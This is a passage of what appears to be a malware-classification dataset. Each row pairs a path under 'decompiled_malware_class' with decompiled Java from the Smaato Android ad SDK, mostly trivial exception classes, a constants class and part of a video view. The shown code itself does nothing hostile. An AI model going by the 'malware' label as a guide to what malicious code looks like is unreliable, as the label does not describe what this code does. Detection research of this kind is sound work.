LogMessage(VideoChrome.TAG,VideoSubView.this.a(str3),1,DebugCategory.DEBUG));                 VideoChrome.this.b().startActivity(new Intent(""android.intent.action.VIEW"",Uri.parse(str3)));               }               return false;             }           } .c().booleanValue();         }       } );       this.b.requestFocus();     }  catch (    RuntimeException e) {       throw e;     } catch (    Exception e2) {       throw new StartingVideoFailedException(e2);     }   }   @Override public boolean onError(  MediaPlayer mediaPlayer,  int i,  int i2){     return new CrashReportTemplate<Boolean>(){       @Override public Boolean b() throws Exception {         VideoSubView.this.a();         return false;       }     } .c().booleanValue();   }   @Override public void onCompletion(  MediaPlayer mediaPlayer){     new CrashReportTemplate<Void>(){       @Override public Void b() throws Exception {         VideoSubView.this.a();         return null;       }     } .c();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.bannerutilities\WebSettingsSetter.code","public interface WebSettingsSetter {   void a(  WebSettings webSettings) throws UnableToApplySDKSettings ; } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.bannerutilities.constant\Values.code","public final class Values {   public static final String ANDROID_PLATFORM_NAME=""android"";   public static final String BLACKBERRY_PLATFORM_NAME=""blackberry"";   public static final String COUNTRY=""US"";   public static final int DEFAULT_AUTO_RELOAD=60;   public static final int DP_50=50;   public static final String KINDLE_PLATFORM_NAME=""kindle"";   public static final String LANGUAGE=""en"";   public static final int MAX_AUTO_RELOAD=600;   public static final int MAX_RELOAD_ATTEMPT=10;   public static final int MESSAGE_CLOSE=102;   public static final int MESSAGE_EXPAND=101;   public static final int MESSAGE_GP_RUNNING=107;   public static final int MESSAGE_HIDE=105;   public static final int MESSAGE_LEGACYEXPAND=106;   public static final int MESSAGE_RESIZE=103;   public static final int MESSAGE_SHOW=104;   public static final int MIN_AUTO_RELOAD=10;   public static final int SDK_7=7;   public static final int SDK_8=8;   public static final String SDK_VERSION_CODE=""4-0-8"";   public static final long SDK_VERSION_CODE_INT=Integer.parseInt(SDK_VERSION_CODE.replaceAll(""-"",""""));   public static final int SECONDS_TO_MILLSECONDS=1000;   public static final int SOMA_API_VER=413;   public static final String SOMA_SDK_VERSION=""sdkandroid_4-0-8"";   public static final String SOMA_TAG=""SOMA"";   private Values(){   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.debug\Debugger.code","!org.eclipse.jdt.core.dom.TypeDeclaration@4cad6f6a"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.debug\LogMessage.code","public class LogMessage {   private String a;   private String b;   private int c;   private DebugCategory d;   private Throwable e;   public LogMessage(  String str,  String str2,  int i,  DebugCategory debugCategory){     this.a=str;     this.b=str2;     this.c=i;     this.d=debugCategory;   }   public LogMessage(  String str,  String str2,  int i,  DebugCategory debugCategory,  Throwable th){     this.a=str;     this.b=str2;     this.c=i;     this.d=debugCategory;     this.e=th;   }   public final String a(){     return this.a;   }   public final String b(){     return this.b;   }   public final int c(){     return this.c;   }   public final DebugCategory d(){     return this.d;   }   public Throwable e(){     return this.e;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\AddingCloseButtonToInterstitialFailed.code","public class AddingCloseButtonToInterstitialFailed extends Exception {   public AddingCloseButtonToInterstitialFailed(){   }   public AddingCloseButtonToInterstitialFailed(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\AddingLoadingStateToBannerViewFailedException.code","public class AddingLoadingStateToBannerViewFailedException extends Exception {   private static final long serialVersionUID=1;   public AddingLoadingStateToBannerViewFailedException(){   }   public AddingLoadingStateToBannerViewFailedException(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\AdDownloaderInstantiationException.code","public class AdDownloaderInstantiationException extends Exception {   private static final long serialVersionUID=1;   public AdDownloaderInstantiationException(){   }   public AdDownloaderInstantiationException(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\AddressFromLocationFailed.code","public class AddressFromLocationFailed extends Exception {   public AddressFromLocationFailed(){   }   public AddressFromLocationFailed(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\AdReceiveFailed.code","public class AdReceiveFailed extends Exception {   private static final long serialVersionUID=1;   public AdReceiveFailed(){   }   public AdReceiveFailed(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\AdRequestConstructionFailed.code","public class AdRequestConstructionFailed extends Exception {   private static final long serialVersionUID=1;   public AdRequestConstructionFailed(){   }   public AdRequestConstructionFailed(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\AlerBannerInstantiationException.code","public class AlerBannerInstantiationException extends AlertViewInstantiationException {   private static final long serialVersionUID=1;   public AlerBannerInstantiationException(){   }   public AlerBannerInstantiationException(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\AlertBannerFailedToRecieveAd.code","public final class AlertBannerFailedToRecieveAd extends AdReceiveFailed {   private static final long serialVersionUID=1;   public AlertBannerFailedToRecieveAd(){   }   public AlertBannerFailedToRecieveAd(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\AlertViewInstantiationException.code","public class AlertViewInstantiationException extends Exception {   private static final long serialVersionUID=1;   public AlertViewInstantiationException(){   }   public AlertViewInstantiationException(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\BannerDisplayedEnteredFailedException.code","public class BannerDisplayedEnteredFailedException extends Exception {   private static final long serialVersionUID=1; } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\BannerHeightForAdDimensionFailed.code","public class BannerHeightForAdDimensionFailed extends Exception {   public BannerHeightForAdDimensionFailed(){   }   public BannerHeightForAdDimensionFailed(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\BannerHttpRequestFailed.code","public class BannerHttpRequestFailed extends Exception {   private static final long serialVersionUID=1;   public BannerHttpRequestFailed(){   }   public BannerHttpRequestFailed(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\BannerLoadingEnteredFailedException.code","public class BannerLoadingEnteredFailedException extends Exception {   private static final long serialVersionUID=1;   public BannerLoadingEnteredFailedException(){   }   public BannerLoadingEnteredFailedException(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\BannerLoadingExitFailedException.code","public class BannerLoadingExitFailedException extends Exception {   private static final long serialVersionUID=1; } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\BannerStateInstantiationException.code","public class BannerStateInstantiationException extends Exception {   private static final long serialVersionUID=1;   public BannerStateInstantiationException(){   }   public BannerStateInstantiationException(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\BannerStateLoggingFailedException.code","public class BannerStateLoggingFailedException extends Exception {   private static final long serialVersionUID=1;   public BannerStateLoggingFailedException(){   }   public BannerStateLoggingFailedException(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\BannerViewInstantiationException.code","public class BannerViewInstantiationException extends Exception {   private static final long serialVersionUID=1;   public BannerViewInstantiationException(){   }   public BannerViewInstantiationException(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\BannerViewSwitchingViewsException.code","public class BannerViewSwitchingViewsException extends Exception {   private static final long serialVersionUID=1;   public BannerViewSwitchingViewsException(){   }   public BannerViewSwitchingViewsException(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\BannerViewXmlAttributeFailed.code","public class BannerViewXmlAttributeFailed extends Exception {   private static final long serialVersionUID=1;   public BannerViewXmlAttributeFailed(){   }   public BannerViewXmlAttributeFailed(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\BannerWidthForAdDimensionFailed.code","public class BannerWidthForAdDimensionFailed extends Exception {   public BannerWidthForAdDimensionFailed(){   }   public BannerWidthForAdDimensionFailed(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\BeaconHttpConnectionFailed.code","public class BeaconHttpConnectionFailed extends Exception {   private static final long serialVersionUID=1;   public BeaconHttpConnectionFailed(){   }   public BeaconHttpConnectionFailed(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\BeaconLoadFailedException.code","public class BeaconLoadFailedException extends Exception {   private static final long serialVersionUID=1;   public BeaconLoadFailedException(){   }   public BeaconLoadFailedException(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\BestGPSProviderFailed.code","public class BestGPSProviderFailed extends Exception {   private static final long serialVersionUID=1;   public BestGPSProviderFailed(){   }   public BestGPSProviderFailed(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\BlockingLoadingStateFailedException.code","public class BlockingLoadingStateFailedException extends Exception {   private static final long serialVersionUID=1;   public BlockingLoadingStateFailedException(){   }   public BlockingLoadingStateFailedException(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\CalculatingScaleFailed.code","public class CalculatingScaleFailed extends Exception {   public CalculatingScaleFailed(){   }   public CalculatingScaleFailed(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\CallingEnterBannerStateFailedException.code","public class CallingEnterBannerStateFailedException extends Exception {   private static final long serialVersionUID=1;   public CallingEnterBannerStateFailedException(){   }   public CallingEnterBannerStateFailedException(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\CallingExitBannerStateExitFailedException.code","public class CallingExitBannerStateExitFailedException extends Exception {   private static final long serialVersionUID=1;   public CallingExitBannerStateExitFailedException(){   }   public CallingExitBannerStateExitFailedException(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\CallingLoadingStateEnteredFailedException.code","public class CallingLoadingStateEnteredFailedException extends Exception {   private static final long serialVersionUID=1;   public CallingLoadingStateEnteredFailedException(){   }   public CallingLoadingStateEnteredFailedException(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\CallingLoadingStateExitFailedException.code","public class CallingLoadingStateExitFailedException extends Exception {   private static final long serialVersionUID=1;   public CallingLoadingStateExitFailedException(){   }   public CallingLoadingStateExitFailedException(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\ChangingBannerStateFailedException.code","public class ChangingBannerStateFailedException extends Exception {   private static final long serialVersionUID=1;   public ChangingBannerStateFailedException(){   }   public ChangingBannerStateFailedException(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\CheckEmailPermissionFailed.code","public class CheckEmailPermissionFailed extends Exception {   private static final long serialVersionUID=1;   public CheckEmailPermissionFailed(){   }   public CheckEmailPermissionFailed(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\ClearViewFailed.code","public class ClearViewFailed extends Exception {   private static final long serialVersionUID=1;   public ClearViewFailed(){   }   public ClearViewFailed(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\CloseButtonBitmapFailed.code","public class CloseButtonBitmapFailed extends Exception {   private static final long serialVersionUID=1;   public CloseButtonBitmapFailed(){   }   public CloseButtonBitmapFailed(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\CloseButtonViewInitFailed.code","public class CloseButtonViewInitFailed extends Exception {   private static final long serialVersionUID=-4806900174224092631L;   public CloseButtonViewInitFailed(){   }   public CloseButtonViewInitFailed(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\ClosingLandingPageFailed.code","public abstract class ClosingLandingPageFailed extends Exception {   private static final long serialVersionUID=1;   public ClosingLandingPageFailed(){   }   public ClosingLandingPageFailed(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\ClosingPackageFailedException.code","public class ClosingPackageFailedException extends Exception {   private static final long serialVersionUID=1;   public ClosingPackageFailedException(){   }   public ClosingPackageFailedException(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\ClosingVideoChromeFailedException.code","public class ClosingVideoChromeFailedException extends Exception {   private static final long serialVersionUID=1;   public ClosingVideoChromeFailedException(){   }   public ClosingVideoChromeFailedException(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\ClosingVideoFailed.code","public class ClosingVideoFailed extends Exception {   private static final long serialVersionUID=1;   public ClosingVideoFailed(){   }   public ClosingVideoFailed(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\CreateBannerPackageFailedException.code","public class CreateBannerPackageFailedException extends Exception {   private static final long serialVersionUID=1;   public CreateBannerPackageFailedException(){   }   public CreateBannerPackageFailedException(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\CreatingBannerPageFailed.code","public class CreatingBannerPageFailed extends Exception {   private static final long serialVersionUID=1;   public CreatingBannerPageFailed(){   }   public CreatingBannerPageFailed(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\CreatingBaseViewFailedException.code","public class CreatingBaseViewFailedException extends Exception {   private static final long serialVersionUID=1;   public CreatingBaseViewFailedException(){   }   public CreatingBaseViewFailedException(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\CreatingExpandAnimationFailed.code","public class CreatingExpandAnimationFailed extends Exception {   private static final long serialVersionUID=1;   public CreatingExpandAnimationFailed(){   }   public CreatingExpandAnimationFailed(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\CreatingSomaBanerPageFailed.code","public class CreatingSomaBanerPageFailed extends Exception {   public CreatingSomaBanerPageFailed(){   }   public CreatingSomaBanerPageFailed(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\DimensionCalculationFailed.code","public class DimensionCalculationFailed extends Exception {   public DimensionCalculationFailed(){   }   public DimensionCalculationFailed(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\DissmissingProgressBarFailed.code","public class DissmissingProgressBarFailed extends Exception {   public DissmissingProgressBarFailed(){   }   public DissmissingProgressBarFailed(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\EditModeFailed.code","public class EditModeFailed extends Exception {   private static final long serialVersionUID=1;   public EditModeFailed(){   }   public EditModeFailed(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\EmailFailed.code","public class EmailFailed extends Exception {   private static final long serialVersionUID=1;   public EmailFailed(){   }   public EmailFailed(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\ErrorBannerLoadingFailedException.code","public class ErrorBannerLoadingFailedException extends Exception {   private static final long serialVersionUID=1;   public ErrorBannerLoadingFailedException(){   }   public ErrorBannerLoadingFailedException(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\ExpandAnimationInstantiationFailed.code","public class ExpandAnimationInstantiationFailed extends Exception {   private static final long serialVersionUID=1;   public ExpandAnimationInstantiationFailed(){   }   public ExpandAnimationInstantiationFailed(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\ExpandingBannerFailed.code","public class ExpandingBannerFailed extends Exception {   private static final long serialVersionUID=1;   public ExpandingBannerFailed(){   }   public ExpandingBannerFailed(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\FacebookAttributionFailedException.code","public class FacebookAttributionFailedException extends Exception {   public FacebookAttributionFailedException(){   }   public FacebookAttributionFailedException(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\FullScreenBannerClosingLandingPageFailed.code","public final class FullScreenBannerClosingLandingPageFailed extends ClosingLandingPageFailed {   private static final long serialVersionUID=1;   public FullScreenBannerClosingLandingPageFailed(){   }   public FullScreenBannerClosingLandingPageFailed(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\FullScreenBannerFailedToReceiveAd.code","public final class FullScreenBannerFailedToReceiveAd extends AdReceiveFailed {   private static final long serialVersionUID=1;   public FullScreenBannerFailedToReceiveAd(){   }   public FullScreenBannerFailedToReceiveAd(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\FullScreenBannerInstantiationException.code","public final class FullScreenBannerInstantiationException extends AlertViewInstantiationException {   private static final long serialVersionUID=1;   public FullScreenBannerInstantiationException(){   }   public FullScreenBannerInstantiationException(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\GenerateUserSettingsFailed.code","public class GenerateUserSettingsFailed extends Exception {   private static final long serialVersionUID=1;   public GenerateUserSettingsFailed(){   }   public GenerateUserSettingsFailed(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\GeneratingAdSettingsRequestFailed.code","public class GeneratingAdSettingsRequestFailed extends Exception {   private static final long serialVersionUID=1;   public GeneratingAdSettingsRequestFailed(){   }   public GeneratingAdSettingsRequestFailed(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\GeneratingBitmapFromStringFailed.code","public class GeneratingBitmapFromStringFailed extends Exception {   public GeneratingBitmapFromStringFailed(){   }   public GeneratingBitmapFromStringFailed(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\GeneratingDeviceDataFailedException.code","public class GeneratingDeviceDataFailedException extends Exception {   private static final long serialVersionUID=1;   public GeneratingDeviceDataFailedException(){   }   public GeneratingDeviceDataFailedException(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\GettingBannerPositionFailed.code","public class GettingBannerPositionFailed extends Exception {   public GettingBannerPositionFailed(){   }   public GettingBannerPositionFailed(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\GettingDisplayLanguageFailed.code","public class GettingDisplayLanguageFailed extends Exception {   public GettingDisplayLanguageFailed(){   }   public GettingDisplayLanguageFailed(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\GettingImageFromServerFailed.code","public class GettingImageFromServerFailed extends Exception {   public GettingImageFromServerFailed(){   }   public GettingImageFromServerFailed(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\GettingViewScreenLocationFailed.code","public class GettingViewScreenLocationFailed extends Exception {   public GettingViewScreenLocationFailed(){   }   public GettingViewScreenLocationFailed(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\GoogleAdvertisingIdFailed.code","public class GoogleAdvertisingIdFailed extends Exception {   public GoogleAdvertisingIdFailed(){   }   public GoogleAdvertisingIdFailed(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\GooglePlayUrlParsingException.code","public class GooglePlayUrlParsingException extends Exception {   private static final long serialVersionUID=1;   public GooglePlayUrlParsingException(){   }   public GooglePlayUrlParsingException(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\HttpConnectorFactoryInstantiationException.code","public class HttpConnectorFactoryInstantiationException extends Exception {   private static final long serialVersionUID=1;   public HttpConnectorFactoryInstantiationException(){   }   public HttpConnectorFactoryInstantiationException(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\HttpConnectorInstantiationException.code","public class HttpConnectorInstantiationException extends Exception {   private static final long serialVersionUID=1;   public HttpConnectorInstantiationException(){   }   public HttpConnectorInstantiationException(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\IntersectionCalculationFailed.code","public class IntersectionCalculationFailed extends Exception {   public IntersectionCalculationFailed(){   }   public IntersectionCalculationFailed(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\InterstitialInitializationFailed.code","public class InterstitialInitializationFailed extends Exception {   public InterstitialInitializationFailed(){   }   public InterstitialInitializationFailed(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\InvalidDateException.code","public class InvalidDateException extends Exception { } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\LatitudeValidationFailed.code","public class LatitudeValidationFailed extends Exception {   private static final long serialVersionUID=1;   public LatitudeValidationFailed(){   }   public LatitudeValidationFailed(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\LoadingAttributesFromLayoutFailed.code","public class LoadingAttributesFromLayoutFailed extends Exception {   private static final long serialVersionUID=1;   public LoadingAttributesFromLayoutFailed(){   }   public LoadingAttributesFromLayoutFailed(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\LoadingBannerStateFailedException.code","public class LoadingBannerStateFailedException extends Exception {   private static final long serialVersionUID=1;   public LoadingBannerStateFailedException(){   }   public LoadingBannerStateFailedException(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\LoadingBeaconFailed.code","public class LoadingBeaconFailed extends Exception {   private static final long serialVersionUID=1;   public LoadingBeaconFailed(){   }   public LoadingBeaconFailed(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\LoadingNewBannerFailedException.code","public class LoadingNewBannerFailedException extends Exception {   private static final long serialVersionUID=1;   public LoadingNewBannerFailedException(){   }   public LoadingNewBannerFailedException(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\LoadingStateLoggingFailedException.code","public class LoadingStateLoggingFailedException extends Exception {   private static final long serialVersionUID=1;   public LoadingStateLoggingFailedException(){   }   public LoadingStateLoggingFailedException(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\LoadingStateTransitionTriggeredFailedException.code","public class LoadingStateTransitionTriggeredFailedException extends Exception {   private static final long serialVersionUID=1;   public LoadingStateTransitionTriggeredFailedException(){   }   public LoadingStateTransitionTriggeredFailedException(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\LocationManagerFailed.code","public class LocationManagerFailed extends Exception {   private static final long serialVersionUID=1;   public LocationManagerFailed(){   }   public LocationManagerFailed(  Throwable th){     super(th);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.smaato.soma.exception\LongitudeValidationFailed.code","public class LongitudeValidationFailed extends Exception {   private static final long serialVersionUID=1;   public LongitudeValidationFailed(){   }   public LongitudeValidationFailed(  Throwable th){     super(th);   } } "
